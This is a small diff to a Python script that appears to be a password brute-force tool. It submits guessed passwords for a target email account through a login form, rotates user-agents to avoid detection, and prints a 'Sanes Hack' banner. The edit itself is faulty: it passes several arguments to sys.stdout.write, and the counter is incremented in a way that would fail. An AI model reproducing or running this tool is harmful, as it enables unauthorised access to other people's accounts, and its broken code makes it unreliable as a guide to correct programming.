@@ -116,9 +116,9 @@ def main():
 count = 0
 def iqbalz(iqbalz_password):
   try:
- 	sys.stdout.write(GG+"\n[\033[91m"+str(count)+"\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m"+iqbalz_password)
-	sys.stdout.flush()
+ 	sys.stdout.write(GG+"\n[\033[91m",str(count),"\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m"+iqbalz_password)
 	count += 1
+	sys.stdout.flush()
 	noobs.addheaders = [('User-agent', random.choice(useragents))]
 	site = noobs.open(login)
 	noobs.select_form(nr = 0)
@@ -177,7 +177,7 @@ def runn_noobs():
                   `.-::////::-.` \033[91;1m
 
                 \033[90;1mLife Of Programmer\033[91;1m
-             Powered by:\033[97m Sanes Hack
+              Powered by:\033[97m Sanes Hack
       """
 
 
